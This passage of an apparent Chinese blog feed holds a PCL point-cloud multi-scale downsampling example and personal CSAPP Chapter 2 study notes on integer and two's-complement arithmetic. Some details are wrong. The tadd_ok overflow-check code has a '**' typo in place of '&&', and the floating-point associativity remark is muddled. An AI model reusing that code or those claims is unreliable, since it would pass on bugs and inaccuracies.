<h2 id="2-2字段连接"><a href="#2-2字段连接" class="headerlink" title="2.2字段连接"></a>2.2字段连接</h2><p>利用<code>concatenateFields</code>将点云的法向量与曲率信息连接。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pcl::PointCloud&lt;pcl::PointNormal&gt;::<span class="function">Ptr <span class="title">cnormals</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointNormal&gt;)</span></span>;</span><br><span class="line">pcl::<span class="built_in">concatenateFields</span>(*cloud,*normals,*cnormals);<span class="comment">//连接字段</span></span><br></pre></td></tr></table></figure>



<h2 id="2-3分区域滤波"><a href="#2-3分区域滤波" class="headerlink" title="2.3分区域滤波"></a>2.3分区域滤波</h2><p>设置合理的曲率阈值<code>cur_threshold</code>，遍历点云，将点云放入不同的点云集合<code>clouddownsample_1</code>和<code>clouddownsample_2</code>，分别设置不同的降采样尺度。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">clouddownsample_1</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">clouddownsample_2</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; cnormals-&gt;points.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">  <span class="keyword">if</span> (cnormals-&gt;<span class="built_in">at</span>(i).curvature &gt; cur_threshold)&#123;<span class="comment">//阈值判断</span></span><br><span class="line">    clouddownsample_1-&gt;points.<span class="built_in">emplace_back</span>(cloud-&gt;points[i]);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    clouddownsample_2-&gt;points.<span class="built_in">emplace_back</span>(cloud-&gt;points[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置必要的信息</span></span><br><span class="line">clouddownsample_1-&gt;width = clouddownsample_1-&gt;points.<span class="built_in">size</span>();</span><br><span class="line">clouddownsample_1-&gt;height = <span class="number">1</span>;</span><br><span class="line">clouddownsample_1-&gt;is_dense = <span class="literal">true</span>;</span><br><span class="line">clouddownsample_2-&gt;width = clouddownsample_2-&gt;points.<span class="built_in">size</span>();</span><br><span class="line">clouddownsample_2-&gt;height = <span class="number">1</span>;</span><br><span class="line">clouddownsample_2-&gt;is_dense = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大尺度降采样</span></span><br><span class="line">pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">cloud_add</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line"><span class="type">float</span> leftSize = <span class="number">0.25f</span>;<span class="comment">//尺度设置</span></span><br><span class="line">pcl::VoxelGrid&lt;pcl::PointXYZ&gt; down;</span><br><span class="line">down.<span class="built_in">setInputCloud</span> (clouddownsample_2);</span><br><span class="line">down.<span class="built_in">setLeafSize</span> (leftSize, leftSize, leftSize);</span><br><span class="line">down.<span class="built_in">filter</span> (*clouddownsample_2);</span><br><span class="line"></span><br><span class="line">*cloud_add = *clouddownsample_1 + *clouddownsample_2;<span class="comment">//合并降采样后的点云</span></span><br></pre></td></tr></table></figure>



<h1 id="三、结果"><a href="#三、结果" class="headerlink" title="三、结果"></a>三、结果</h1><h2 id="3-1原始图像"><a href="#3-1原始图像" class="headerlink" title="3.1原始图像"></a>3.1原始图像</h2><p><img src="/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/image-20230918150913761.png" alt="原始图像"></p>
<h2 id="3-2曲率估计图像"><a href="#3-2曲率估计图像" class="headerlink" title="3.2曲率估计图像"></a>3.2曲率估计图像</h2><p>曲率高的地方为边界。</p>
<p><img src="/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/image-20230918151009863.png" alt="曲率估计图像"></p>
<h2 id="3-3降采样图像"><a href="#3-3降采样图像" class="headerlink" title="3.3降采样图像"></a>3.3降采样图像</h2><p>边界信息较好的保留了下来</p>
<p><img src="/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/image-20230918151106060.png" alt="image-20230918151106060"></p>
<h2 id="3-4不足"><a href="#3-4不足" class="headerlink" title="3.4不足"></a>3.4不足</h2><p>整体对曲率估计时的<code>邻域半径设置</code>比较敏感，若设置过小，极易受到噪声点的干扰，如下图的曲率估计。</p>
<p><img src="/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/image-20230918151458899.png" alt="image-20230918151458899"></p>
]]></content>
      <categories>
        <category>点云处理</category>
      </categories>
      <tags>
        <tag>滤波</tag>
        <tag>PCL</tag>
        <tag>降采样</tag>
        <tag>多尺度</tag>
        <tag>C++</tag>
        <tag>条件滤波</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP</title>
    <url>/2023/09/19/CSAPP/</url>
    <content><![CDATA[<h1 id="1-第一章"><a href="#1-第一章" class="headerlink" title="1.第一章"></a>1.第一章</h1><h2 id="1-2编译"><a href="#1-2编译" class="headerlink" title="1.2编译"></a>1.2编译</h2><p>源文件编译成可执行文件：预处理器—&gt;编译器—&gt;汇编器—&gt;链接器</p>
<p>在Linux上:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o hello hello.c</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/19/CSAPP/image-20230919212328818.png" alt="image-20230919212328818"></p>
<h1 id="2-第二章：信息的表示和处理"><a href="#2-第二章：信息的表示和处理" class="headerlink" title="2.第二章：信息的表示和处理"></a>2.第二章：信息的表示和处理</h1><p><strong>三种符号表示：</strong></p>
<ul>
<li>无符号编码 unsigned encodings ：传统的二进制编码，用于表示<strong>大于等于0</strong>的数。</li>
<li>补码编码 Two‘s-complement encodings：表示有符号整数，用于表示<strong>正数和负数</strong>。</li>
<li>浮点数编码 Floating-point encodings：表示实数以<strong>2为基数的科学计数法</strong>。</li>
</ul>
<p><strong>浮点数溢出：</strong></p>
<ul>
<li>整数时精确表示，浮点数是近似表示</li>
<li>浮点数计算没有乘法结合律。其溢出的大小是<code>+∞</code>，即<code>(3.14+1e20)-1e20</code>答案会是<code>0</code>，<code>3.14+(1e20-1e20)</code>的结果是<code>3.14</code>。</li>
</ul>
<h2 id="2-1信息存储"><a href="#2-1信息存储" class="headerlink" title="2.1信息存储"></a>2.1信息存储</h2><p>机器层级程序将内存视为大的字节数组，即为<strong>虚拟内存</strong>。</p>
<h3 id="2-1-1-hexadecimal-notation-十六进制表示法"><a href="#2-1-1-hexadecimal-notation-十六进制表示法" class="headerlink" title="2.1.1 hexadecimal notation 十六进制表示法"></a>2.1.1 hexadecimal notation 十六进制表示法</h3><ul>
<li><p>16进制表示位操作比较方便，其用数字0-9，以及字母A-F表示16位数。</p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20230920221427329.png" alt="2，10，16进制转换表"></p>
</li>
<li><p>16进制的一个0，代表2进制的4个0</p>
</li>
</ul>
<h3 id="2-1-2-Data-sizes-数据大小"><a href="#2-1-2-Data-sizes-数据大小" class="headerlink" title="2.1.2 Data sizes 数据大小"></a>2.1.2 Data sizes 数据大小</h3><ul>
<li>对于具有<code>W</code>字节大小的机器，虚拟地址的范围可以从<code>0 - (2^w-1)</code></li>
<li>在<code>64位</code>操作系统中，<code>int</code>为<code>4字节</code>；在<code>32位</code>操作系统中，<code>long</code>为<code>4字节</code>，在<code>64位</code>时为<code>8字节</code>。</li>
<li>为了避免编译器和操作系统的原因，在<code>iso  c99</code>中，规定了<code>int32_t</code>和<code>int64_t</code>分别表示<code>4字节</code>和<code>8字节</code>，不受到编译器和系统的影响。</li>
<li>char * 指针，使用程序的全字长。</li>
<li><img src="/2023/09/19/CSAPP/image-20230921193920402.png" alt="c语言中每个数据对应的字节大小"></li>
</ul>
<h3 id="2-1-3-Addressing-and-byte-ordering-寻址和字节顺序"><a href="#2-1-3-Addressing-and-byte-ordering-寻址和字节顺序" class="headerlink" title="2.1.3 Addressing and byte ordering 寻址和字节顺序"></a>2.1.3 Addressing and byte ordering 寻址和字节顺序</h3><ul>
<li><p>大端：<strong>即内存低地址存放数据高位字节</strong>，内存高地址存放数据低位字节。最高有效字节在最前面的方式</p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20230921195819228.png" alt="大端"></p>
</li>
<li><p>小端：<strong>即内存低地址存放数据低位字节</strong>，内存高地址存放数据高位字节。最低有效字节在最前面的方式</p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20230921195856176.png" alt="小端"></p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20230921202116110.png" alt="image-20230921202116110"></p>
</li>
<li><p><code>typedef</code> 提高了代码的可读性，也就是<strong>起别名。。。</strong></p>
</li>
</ul>
<h3 id="2-1-4字符串的表示"><a href="#2-1-4字符串的表示" class="headerlink" title="2.1.4字符串的表示"></a>2.1.4字符串的表示</h3><h3 id="2-1-6-introduction-to-Boolean-algebra-布尔代数的介绍"><a href="#2-1-6-introduction-to-Boolean-algebra-布尔代数的介绍" class="headerlink" title="2.1.6 introduction to Boolean algebra 布尔代数的介绍"></a>2.1.6 introduction to Boolean algebra 布尔代数的介绍</h3><ul>
<li><p><code>非~</code>、<code>与&amp;</code>、<code>或|</code>、<code>异或^</code>。</p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20230921204632371.png" alt="image-20230921204632371"></p>
</li>
<li><p>位向量  用int或char来单纯表示0、1过于浪费空间，只需要用一个二进制的位就够了。</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231009195826433.png" alt="位向量"></li>
</ul>
</li>
</ul>
<h3 id="2-1-7-bit-level-operations-in-C-c语言中的位操作"><a href="#2-1-7-bit-level-operations-in-C-c语言中的位操作" class="headerlink" title="2.1.7 bit-level operations in C c语言中的位操作"></a>2.1.7 bit-level operations in C c语言中的位操作</h3><ul>
<li><p>进行位操作时先将16进制转换位2进制，进行位操作，操作完了在转换为16进制</p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20230921205258722.png" alt="2."></p>
</li>
<li><p>练习题2.13 bis&#x2F;bic实现 逻辑运算实现即可</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231009201405400.png" alt="习题2.13"></li>
</ul>
</li>
</ul>
<h3 id="2-1-8-logical-operations-in-C-c语言中的逻辑运算"><a href="#2-1-8-logical-operations-in-C-c语言中的逻辑运算" class="headerlink" title="2.1.8 logical operations in C c语言中的逻辑运算"></a>2.1.8 logical operations in C c语言中的逻辑运算</h3><ul>
<li><p>逻辑运算符：<code>||或</code> 、<code>&amp;&amp;与</code> 、<code>！非</code>。</p>
</li>
<li><p><strong>逻辑运算与位运算的功能完全不同</strong>，逻辑运算符将任何<code>非0</code>的参数视为<code>true</code>，将<code>参数0</code>视为<code>false</code>。</p>
</li>
<li><p>逻辑运算符与位运算符区别：</p>
<p>只在参数<strong>严格</strong>限制为<code>0</code>或<code>1</code>的情况下，才会对应</p>
<p>如果可以计算第一个表达式的结果，则逻辑运算符不会计算第二个表达式，例如<code>”&amp;&amp; 5/a“</code>永远不会表示被<code>0</code>除；<code>”p &amp;&amp; *p++“</code> 永远不会导致空指针的取消引用。——–》即如果能够直接判断出结果后面就不要在判断了</p>
</li>
</ul>
<h3 id="2-1-9-shift-operations-in-c-c语言中的移位运算"><a href="#2-1-9-shift-operations-in-c-c语言中的移位运算" class="headerlink" title="2.1.9 shift operations in c c语言中的移位运算"></a>2.1.9 shift operations in c c语言中的移位运算</h3><ul>
<li>c语言还提供了移位操作，用于将位模式左移和右移</li>
<li>分为算数左右移位和逻辑左右移位。在算数右移中，是在左端补k个最高有效位的值<ul>
<li>逻辑右移是在左端比k个0</li>
</ul>
</li>
<li><strong>算数移位：</strong>对带符号的数进行移位。</li>
<li><strong>逻辑移位：</strong>对无符号的数进行移位。</li>
<li><img src="/2023/09/19/CSAPP/image-20230921213312357.png" alt="image-20230921213312357"></li>
</ul>
<h2 id="2-2-integer-representations-整数表示"><a href="#2-2-integer-representations-整数表示" class="headerlink" title="2.2 integer representations 整数表示"></a>2.2 integer representations 整数表示</h2><ul>
<li><img src="/2023/09/19/CSAPP/image-20231009203048479.png" alt="操作术语"></li>
</ul>
<h3 id="2-2-2-无符号数编码"><a href="#2-2-2-无符号数编码" class="headerlink" title="2.2.2 无符号数编码"></a>2.2.2 无符号数编码</h3><ul>
<li><p>定义</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231009203641561.png" alt="二进制转无符号数"></li>
</ul>
</li>
<li><p>无符号数编码具有唯一性！！！</p>
</li>
</ul>
<h3 id="2-2-3-Two’s-complement-encodings-二进制补码编码"><a href="#2-2-3-Two’s-complement-encodings-二进制补码编码" class="headerlink" title="2.2.3 Two’s-complement encodings 二进制补码编码"></a>2.2.3 Two’s-complement encodings 二进制补码编码</h3><ul>
<li>定义<ul>
<li><img src="/2023/09/19/CSAPP/image-20231009204611983.png" alt="b2t的定义"></li>
</ul>
</li>
<li>多数的计算机使用二进制补码编码</li>
<li><strong>最高位为符号位</strong></li>
<li><img src="/2023/09/19/CSAPP/image-20231004200721043.png" alt="二进制补码示意"></li>
<li>补码范围是不对称的—》由于0的存在是非负数</li>
<li><img src="/2023/09/19/CSAPP/image-20231004201545347.png" alt="image-20231004201545347"></li>
<li>为了在不同编译环境上代码通用一般使用<code>intN_t</code>和<code>uintN_t</code>，来定义整数类型。以及使用<code>INTN_MIN</code>和<code>UINTN_MAX</code>来设定最大最小值。N代表多少位。</li>
</ul>
<h3 id="2-2-4-conversations-between-signed-and-unsigned-有符号和无符号之间的转换"><a href="#2-2-4-conversations-between-signed-and-unsigned-有符号和无符号之间的转换" class="headerlink" title="2.2.4 conversations between signed and unsigned 有符号和无符号之间的转换"></a>2.2.4 conversations between signed and unsigned 有符号和无符号之间的转换</h3><ul>
<li><p>定义</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231009212450537.png" alt="补码转换位无符号"></li>
</ul>
</li>
<li><p><strong>基于位级操作</strong>，而不是基于数字，转换后位相同 但改变的是解释方式！！！从有符号到无符号</p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20231004204849433.png" alt="例子"></p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20231004205315694.png" alt="例子2"></p>
</li>
</ul>
<h3 id="2-2-5-signed-versus-unsigned-in-C-c语言中的有符号和无符号"><a href="#2-2-5-signed-versus-unsigned-in-C-c语言中的有符号和无符号" class="headerlink" title="2.2.5 signed versus unsigned in C c语言中的有符号和无符号"></a>2.2.5 signed versus unsigned in C c语言中的有符号和无符号</h3><ul>
<li>大多数都默认有符号，若要采用无符号时。则添加后缀<code>U</code>或者<code>u</code>。</li>
<li>当C语言处理包含一个有符号，另一个无符号的数量表达式时，会隐式的将有符号参数转换为无符号参数进行操作，如下图（<code>*</code>号表示隐式转换）<ul>
<li><img src="/2023/09/19/CSAPP/image-20231006211527406.png" alt="有符号和无符号操作"></li>
</ul>
</li>
</ul>
<h3 id="2-2-6-expanding-the-bit-representation-of-a-number-拓展一个数字的位表示"><a href="#2-2-6-expanding-the-bit-representation-of-a-number-拓展一个数字的位表示" class="headerlink" title="2.2.6 expanding the bit representation of a number 拓展一个数字的位表示"></a>2.2.6 expanding the bit representation of a number 拓展一个数字的位表示</h3><ul>
<li>当使用无符号数向大的数据格式进行转换时，可以使用零扩展</li>
<li>将补码数（有符号数）转换为更大的数据格式进行转换时，进行符号拓展，即将最高有效位的副本添加在表示中<ul>
<li><img src="/2023/09/19/CSAPP/image-20231006214135381.png" alt="符号拓展"></li>
<li><img src="/2023/09/19/CSAPP/image-20231006214245178.png" alt="栗子"></li>
<li><img src="/2023/09/19/CSAPP/image-20231006214318187.png" alt="栗子2"></li>
</ul>
</li>
</ul>
<h3 id="2-2-7-truncating-numbers-截断数字"><a href="#2-2-7-truncating-numbers-截断数字" class="headerlink" title="2.2.7 truncating numbers 截断数字"></a>2.2.7 truncating numbers 截断数字</h3><ul>
<li><img src="/2023/09/19/CSAPP/image-20231006215059758.png" alt="image-20231006215059758"></li>
<li>将w位数字截断为k位数字的时候，首先删除W-K位，然后截断一个数字 表征他的溢出形式<ul>
<li><img src="/2023/09/19/CSAPP/image-20231006215547234.png" alt="image-20231006215547234"></li>
</ul>
</li>
<li>对于有符号数，类似，但需要将最高位转换为符号位：<ul>
<li><img src="/2023/09/19/CSAPP/image-20231006215712492.png" alt="image-20231006215712492"></li>
<li><img src="/2023/09/19/CSAPP/image-20231006215737301.png" alt="image-20231006215737301"></li>
</ul>
</li>
</ul>
<h2 id="2-3-integer-arithmetic-整数算数"><a href="#2-3-integer-arithmetic-整数算数" class="headerlink" title="2.3 integer arithmetic 整数算数"></a>2.3 integer arithmetic 整数算数</h2><h3 id="2-3-1-unsigned-addition-无符号加法"><a href="#2-3-1-unsigned-addition-无符号加法" class="headerlink" title="2.3.1 unsigned addition 无符号加法"></a>2.3.1 unsigned addition 无符号加法</h3><ul>
<li>定义<ul>
<li><img src="/2023/09/19/CSAPP/image-20231009215035060.png" alt="无符号数加法"></li>
</ul>
</li>
<li>溢出情况需要减去2^w，<strong>相当于取模操作！！！</strong>取了2^w的模</li>
</ul>
<h3 id="2-3-2Two‘s-complement-addition-补码加法"><a href="#2-3-2Two‘s-complement-addition-补码加法" class="headerlink" title="2.3.2Two‘s complement addition 补码加法"></a>2.3.2Two‘s complement addition 补码加法</h3><ul>
<li><p>关键的是，结果太大（整数）和结果太小（负数）时应该如何做</p>
</li>
<li><p>定义</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231010191636845.png" alt="image-补码加法"></li>
</ul>
</li>
<li><p>过大过小都会截断</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231010192438753.png" alt="4位补码加法例子"></li>
</ul>
</li>
<li><p><strong>习题2.29</strong></p>
<ul>
<li><table>
<thead>
<tr>
<th align="center">x</th>
<th align="center">y</th>
<th align="center">x+y(6)</th>
<th align="center">x(+t5)y</th>
<th align="center">情况</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-12[10100]</td>
<td align="center">-15[10001]</td>
<td align="center">-27[100101]</td>
<td align="center">5[00101]</td>
<td align="center">1负溢出</td>
</tr>
<tr>
<td align="center">-8[11000]</td>
<td align="center">-8[11000]</td>
<td align="center">-16[110000]</td>
<td align="center">-16[10000]???</td>
<td align="center">2没有溢出。因为补码负数表示会多一位</td>
</tr>
<tr>
<td align="center">-9[10111]</td>
<td align="center">8[01000]</td>
<td align="center">-1[111111]</td>
<td align="center">-1[11111]</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">2[00010]</td>
<td align="center">5[00101]</td>
<td align="center">7[000111]</td>
<td align="center">7[00111]</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">12[01100]</td>
<td align="center">4[00100]</td>
<td align="center">16[010000]</td>
<td align="center">-16[10000]</td>
<td align="center">4正溢出</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p><strong>习题2.30</strong></p>
<p>判断参数x和参数y相加是否溢出</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tadd_ok</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sum = x + y;</span><br><span class="line">    <span class="type">int</span> neg_over = x &lt; <span class="number">0</span> &amp;&amp; y &lt; <span class="number">0</span> &amp;&amp; sum &gt;= <span class="number">0</span>;<span class="comment">//负数溢出</span></span><br><span class="line">    <span class="type">int</span> pos_over = x &gt;= <span class="number">0</span> &amp;&amp; y &gt;= <span class="number">0</span> ** sum &lt; <span class="number">0</span>;<span class="comment">//正数溢出</span></span><br><span class="line">    <span class="keyword">return</span> !neg_over &amp;&amp; !pos_over;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>2.31</p>
<p><img src="/2023/09/19/CSAPP/image-20231013193801498.png" alt="习题2.31"></p>
</li>
</ul>
<p><strong>因为补码本质上是一种取模运算</strong>，所以sum - x &#x3D;（x+y）-x &#x3D; （x-x）+y &#x3D; y 无论何时都成立</p>
<ul>
<li><p>2.32</p>
<ul>
<li><p><img src="/2023/09/19/CSAPP/image-20231013203103790.png" alt="练习题2.32"></p>
</li>
<li><p>补码取相反数的问题， 当一个数除了负数位之外的其他位全是0的时候变相反数时还会是原来的数了，如果为<code>y = INT_MIN</code>时会报错</p>
</li>
<li><p><code>-2^31[10000000,00000000,00000000,00000000] </code>取反后为<code>2^31[00000000,10000000,00000000,00000000,00000000]</code> 但二进制超出了4个字节限制 会发生截断，所以仍然是   <code>-2^31[10000000,00000000,00000000,00000000] </code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tsub_ok</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (y == INT_MIN) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> tadd_ok(x, -y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="2-3-3-补码的非"><a href="#2-3-3-补码的非" class="headerlink" title="2.3.3 补码的非"></a>2.3.3 补码的非</h3><ul>
<li><p>定义</p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20231013205818392.png" alt="补码的非"></p>
</li>
<li><p>习题2.33 <strong>注意Tmin</strong></p>
<ul>
<li><table>
<thead>
<tr>
<th>x</th>
<th>x</th>
<th>取反</th>
<th>取反</th>
</tr>
</thead>
<tbody><tr>
<td>十六进制</td>
<td>十进制</td>
<td>十进制</td>
<td>十六进制</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>5</td>
<td>5</td>
<td>-5</td>
<td>B</td>
</tr>
<tr>
<td>8</td>
<td>-8</td>
<td>-8</td>
<td>8</td>
</tr>
<tr>
<td>D</td>
<td>-3</td>
<td>3</td>
<td>3</td>
</tr>
<tr>
<td>F</td>
<td>-1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>补码非的位级表示</p>
<ul>
<li>对每一位求补在对结果加一（取反加一）<ul>
<li><img src="/2023/09/19/CSAPP/image-20231013210716046.png" alt="取反+1"></li>
</ul>
</li>
<li>找到最右边的k &#x3D; 1，然后对k的左边所有位取反<ul>
<li><img src="/2023/09/19/CSAPP/image-20231013210745590.png" alt="k左边取反"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-3-4无符号乘法"><a href="#2-3-4无符号乘法" class="headerlink" title="2.3.4无符号乘法"></a>2.3.4无符号乘法</h3><ul>
<li>定义：<ul>
<li><img src="/2023/09/19/CSAPP/image-20231013211043062.png" alt="无符号乘法"></li>
</ul>
</li>
</ul>
<h3 id="2-3-5补码乘法"><a href="#2-3-5补码乘法" class="headerlink" title="2.3.5补码乘法"></a>2.3.5补码乘法</h3><ul>
<li><p>定义：</p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20231013211223094.png" alt="补码乘法"></p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20231013211545984.png" alt="无符号和补码 位级相同"></p>
</li>
<li><p>习题2.34</p>
<ul>
<li><table>
<thead>
<tr>
<th>模式</th>
<th>x</th>
<th>y</th>
<th>x*y</th>
<th>截断后x*y</th>
</tr>
</thead>
<tbody><tr>
<td>无符号</td>
<td>4[100]</td>
<td>5[101]</td>
<td>20[010100]</td>
<td>4[100]</td>
</tr>
<tr>
<td>补码</td>
<td>-4[100]</td>
<td>-3[101]</td>
<td>12[001100]</td>
<td>-4[100]</td>
</tr>
<tr>
<td>无符号</td>
<td>2[010]</td>
<td>7[111]</td>
<td>14[001110]</td>
<td>6[110]</td>
</tr>
<tr>
<td>补码</td>
<td>2[010]</td>
<td>-1[111]</td>
<td>-2[111110]</td>
<td>-2[110]</td>
</tr>
<tr>
<td>无符号</td>
<td>6[110]</td>
<td>6[110]</td>
<td>36[100100]</td>
<td>4[100]</td>
</tr>
<tr>
<td>补码</td>
<td>-2[110]</td>
<td>-2[110]</td>
<td>4[000100]</td>
<td>-4[100]</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h3 id="2-3-6乘以常数"><a href="#2-3-6乘以常数" class="headerlink" title="2.3.6乘以常数"></a>2.3.6乘以常数</h3><ul>
<li>通过移位运算的方式实现乘法，减少计算器运算周期<ul>
<li><img src="/2023/09/19/CSAPP/image-20231013214235949.png" alt="乘法的移位运算"></li>
<li><img src="/2023/09/19/CSAPP/image-20231013214440879.png" alt="乘法移位总结"></li>
</ul>
</li>
</ul>
<h3 id="2-3-7除以2的幂"><a href="#2-3-7除以2的幂" class="headerlink" title="2.3.7除以2的幂"></a>2.3.7除以2的幂</h3><ul>
<li><p>整数除法要比整数乘法更慢 </p>
</li>
<li><p>除以2的幂也可以用移位运算来实现 只不过用右移</p>
</li>
<li><p>无符号右移</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231013215918001.png" alt="无符号右移"></li>
<li><img src="/2023/09/19/CSAPP/image-20231013220427774.png" alt="无符号除法移位"></li>
</ul>
</li>
<li><p>有符号 向下舍入</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231013220613662.png" alt="有符号移位"></li>
<li><img src="/2023/09/19/CSAPP/image-20231013220652590.png" alt="负数移位"></li>
<li>添加适当偏置量，结果向上舍入</li>
<li><img src="/2023/09/19/CSAPP/image-20231013220949766.png" alt="偏置"></li>
<li><img src="/2023/09/19/CSAPP/image-20231013221109889.png" alt="image-20231013221109889"></li>
</ul>
</li>
</ul>
<h3 id="2-3-8总结"><a href="#2-3-8总结" class="headerlink" title="2.3.8总结"></a>2.3.8总结</h3><ul>
<li><p><strong>习题2.44</strong></p>
</li>
<li><p><img src="/2023/09/19/CSAPP/image-20231013222149344.png" alt="习题2.44"></p>
<ul>
<li><code>||</code>要为假则两边都应该是假</li>
</ul>
</li>
<li><p>补码正负数表示的范围是不对成的，正数<code>cast</code>到负数一般没有事，但是负数cast到正数需要考虑<code>Tmin</code></p>
<ul>
<li><p><code>A.</code>假。当x &#x3D; -2147483648（Tmin32）。那么，有x-1等于2147483647（Tmax32）负溢出</p>
<ul>
<li>Tmin[10000000,00000000,00000000,00000000]，</li>
</ul>
</li>
<li><p>-1[111111111,11111111,11111111,11111111],</p>
<ul>
<li>TMIN+(-1) [1,01111111,11111111,11111111,11111111]。</li>
<li>负溢出—截断 [01111111,11111111,11111111,11111111]。</li>
</ul>
</li>
<li><p><code>B.</code>真。如果<code>（x&amp;7）!= 7</code>这个表达式的值为0，那么必须有位x2 等于1.当左移29位时，这个位将变为符号位。</p>
<ul>
<li><code>（x&amp;7）!= 7</code>这个表达式为0 那么左边表达式结果应该为7  所以必然有x2位 等于1，当他左移29 位会变成符号位成为负数 小于1</li>
</ul>
</li>
<li><p><code>c.</code>假。正数溢出可能得到负值</p>
</li>
<li><p><code>d.</code>真。若想为假则需要两边都为假。那么如果x为非负数，则-x必然为非正，因为 取值返回不对成</p>
</li>
<li><p><code>e.</code>假。若x为负数Tmin，那么-x仍然为Tmin。</p>
</li>
<li><p><code>f.</code>真。位级运算层面比较 补码和无符号加法有相同的位级行为，所以从位级来看他们是相同的</p>
</li>
<li><p>·g·真 。~y等于 -y-1. ux*uy 等于x *y，因此等式左边等于 x*-y -x +x *y。 同样也是位级比较</p>
</li>
</ul>
</li>
</ul>
<h2 id="2-4浮点数"><a href="#2-4浮点数" class="headerlink" title="2.4浮点数"></a>2.4浮点数</h2><h3 id="2-4-1二进制小数"><a href="#2-4-1二进制小数" class="headerlink" title="2.4.1二进制小数"></a>2.4.1二进制小数</h3><ul>
<li><p>十进制表示法：</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231014204221901.png" alt="十进制的小数表示法"></li>
</ul>
</li>
<li><p>类似的有二进制表示</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231014204554054.png" alt="二进制表示"></li>
</ul>
</li>
<li><p>局限性：移位长度有限编码，所以有些数只能近似表示 ，增加相应表示的长度也可以增加精度</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231014204911872.png" alt="表示精度"></li>
</ul>
</li>
<li><p>习题2.45</p>
<ul>
<li><table>
<thead>
<tr>
<th align="center">小数值</th>
<th align="center">二进制表示</th>
<th align="center">十进制表示</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1&#x2F;8</td>
<td align="center">0.001</td>
<td align="center">0.125</td>
</tr>
<tr>
<td align="center">3&#x2F;4</td>
<td align="center">0.11</td>
<td align="center">0.75</td>
</tr>
<tr>
<td align="center">25&#x2F;16</td>
